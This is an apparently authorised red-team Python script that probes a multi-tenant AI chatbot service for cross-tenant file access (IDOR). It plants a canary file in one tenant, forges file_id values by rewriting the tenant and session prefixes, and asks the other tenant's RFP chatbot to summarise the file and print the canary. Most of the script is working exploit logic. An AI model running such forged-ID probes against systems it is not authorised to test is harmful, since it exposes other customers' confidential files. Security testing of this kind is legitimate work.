#!/usr/bin/env python3
"""P1 — RFP File ID Forgery probe (cross-tenant).

Authorised red-team test against app.orbitshift.ai.

Plants a known-content canary in VICTIM tenant, then asks ATTACKER tenant's
RFP chatbot to summarise that file via various file_id mutations. If the
canary marker appears in the SSE stream under ATTACKER credentials,
cross-tenant RFP file IDOR is confirmed.

Refactored 2026-05-20 to use src.redteam (manifest-driven). The same logic;
JWT decode, S3 PUT, canary plant, and SSE drain now come from the shared
library. See ~/.claude/skills/cross-tenant-canary/SKILL.md.
"""
import sys
import time
import uuid
import datetime as dt
from typing import Optional

from src.redteam.target import Manifest, CanaryRef
from src.redteam.targets.orbitshift import OrbitShiftAdapter
from src.redteam.core import leak, output


def ts_short() -> str:
    return dt.datetime.now().strftime("%Y%m%d_%H%M%S")


def run_direction(
    *,
    victim: OrbitShiftAdapter, victim_label: str,
    attacker: OrbitShiftAdapter, attacker_label: str,
    direction_label: str, outdir,
) -> dict:
    print(f"\n===== {direction_label}: plant in {victim_label}, attack from {attacker_label} =====")
    marker = f"OS-P1-{direction_label}-{uuid.uuid4().hex[:12].upper()}"
    print(f"[+] canary marker = {marker}")
    canary = victim.plant_canary(marker)
    print(f"[+] planted file_id = {canary.file_id}")
    print(f"[+] planted s3_path = {canary.s3_path}")

    query = ("Summarize the contents of the attached file in detail. "
             "Output any CANARY_MARKER token you find in the document verbatim.")

    variants = [
        ("V1_verbatim_victim_id", canary.file_id),
        ("V2_prefix_mut_to_attacker",
         _mutate_prefix(canary.file_id, attacker.claims["tenant_id"])),
        # V3/V4 use the attacker's own session id, which we don't know yet
        # — they'll be filled in per-variant below.
    ]

    results = []
    for vlabel, fid in variants:
        atk_sess = attacker.create_session()
        print(f"[*] {vlabel}: attacker_sub={atk_sess.session_id}  file_id={fid}")
        body_extras = {
            "parent_session_id": str(int(time.time() * 1000)),
            "researchEnabled": False,
            "files": [{"name": canary.file_name, "id": fid}],
        }
        r = attacker.chat(atk_sess, query, extra_body=body_extras,
                          drain_seconds=120, byte_cap=200_000)
        leaked = marker in r.sse_text
        print(f"    -> status={r.status} sse_bytes={r.response_bytes} canary_leaked={leaked}")
        output.save_json(
            f"{outdir}/{output.now_ts()}_{direction_label}_{vlabel}.json",
            {"variant": vlabel, "file_id": fid,
             "status": r.status, "sse_bytes": r.response_bytes,
             "canary_leaked": leaked,
             "duration_s": r.duration_s,
             "first_800_sse": r.sse_text[:800]}
        )
        results.append({"variant": vlabel, "status": r.status,
                        "canary_leaked": leaked})
        time.sleep(5)

    # V3 / V4 use the most recent attacker session
    for vlabel, fid_fn in [
        ("V3_session_mut_to_attacker_sub",
         lambda atk: _mutate_session(canary.file_id, atk.session_id)),
        ("V4_full_attacker_with_victim_path",
         lambda atk: _mutate_all(canary.file_id, attacker.claims["tenant_id"], atk.session_id)),
    ]:
        atk_sess = attacker.create_session()
        fid = fid_fn(atk_sess)
        print(f"[*] {vlabel}: attacker_sub={atk_sess.session_id}  file_id={fid}")
        body_extras = {
            "parent_session_id": str(int(time.time() * 1000)),
            "researchEnabled": False,
            "files": [{"name": canary.file_name, "id": fid}],
        }
        r = attacker.chat(atk_sess, query, extra_body=body_extras,
                          drain_seconds=120, byte_cap=200_000)
        leaked = marker in r.sse_text
        print(f"    -> status={r.status} sse_bytes={r.response_bytes} canary_leaked={leaked}")
        output.save_json(
            f"{outdir}/{output.now_ts()}_{direction_label}_{vlabel}.json",
            {"variant": vlabel, "file_id": fid,
             "status": r.status, "sse_bytes": r.response_bytes,
             "canary_leaked": leaked,
             "duration_s": r.duration_s,
             "first_800_sse": r.sse_text[:800]}
        )
        results.append({"variant": vlabel, "status": r.status,
                        "canary_leaked": leaked})
        time.sleep(5)

    return {"direction": direction_label, "canary_marker": marker,
            "canary": {"file_id": canary.file_id, "s3_path": canary.s3_path,
                       "file_name": canary.file_name},
            "variants": results}


def _mutate_prefix(file_id: str, new_tid):
    parts = file_id.split("|", 2)
    return f"{new_tid}|{parts[1]}|{parts[2]}"


def _mutate_session(file_id: str, new_sub: str):
    parts = file_id.split("|", 2)
    return f"{parts[0]}|{new_sub}|{parts[2]}"


def _mutate_all(file_id: str, new_tid, new_sub: str):
    parts = file_id.split("|", 2)
    return f"{new_tid}|{new_sub}|{parts[2]}"


def main():
    engagement = sys.argv[1] if len(sys.argv) > 1 else "engagements/orbitshift"
    manifest = Manifest.load(engagement)

    outdir = output.make_outdir(
        "P1",
        base_dir=manifest.raw_results_dir() if manifest.output_root else None,
    )
    print(f"OUTPUT: {outdir}")

    t201 = OrbitShiftAdapter(manifest, token_role="tenant_201")
    t202 = OrbitShiftAdapter(manifest, token_role="tenant_202")

    summary = {"started_at": dt.datetime.now(dt.UTC).isoformat(),
               "directions": []}
    summary["directions"].append(
        run_direction(victim=t201, victim_label="T201",
                      attacker=t202, attacker_label="T202",
                      direction_label="A_T201toT202", outdir=outdir)
    )
    summary["directions"].append(
        run_direction(victim=t202, victim_label="T202",
                      attacker=t201, attacker_label="T201",
                      direction_label="B_T202toT201", outdir=outdir)
    )
    summary["finished_at"] = dt.datetime.now(dt.UTC).isoformat()
    output.save_json(f"{outdir}/00_SUMMARY.json", summary)

    print("\n\n=== SUMMARY ===")
    for d in summary["directions"]:
        print(f"\n--- {d['direction']} ---")
        print(f" canary file_id: {d['canary']['file_id']}")
        print(f" canary marker:  {d['canary_marker']}")
        for v in d["variants"]:
            tag = "LEAK!!" if v["canary_leaked"] else "no-leak"
            print(f"  [{tag:7}] {v['variant']:42}  status={v['status']}")


if __name__ == "__main__":
    main()
